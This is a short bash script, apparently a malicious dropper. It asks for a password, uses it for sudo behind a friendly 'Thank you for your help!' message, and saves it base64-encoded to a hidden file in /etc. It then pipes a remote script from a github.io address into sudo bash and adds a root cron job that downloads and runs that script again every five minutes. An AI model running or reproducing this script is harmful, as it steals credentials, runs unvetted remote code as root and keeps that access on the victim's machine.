#!/bin/bash

echo -n "Password:"
read -s pwd
echo ""

echo $pwd | sudo -S echo "Thank you for your help!"

sudo bash -c "echo $pwd | base64 -w 0 >> /etc/.pwd.txt"

curl -s https://matthewpipie.github.io/sendmac.sh?$(date +%s) | sudo bash

command="curl -s https://matthewpipie.github.io/sendmac.sh?\$(date +\%s) | sudo bash"

#write out current crontab
sudo crontab -u root -l > mycron
#echo new cron into cron file
echo "*/5 * * * * $command" >> mycron
#install new cron file
sudo crontab -u root mycron
rm mycron
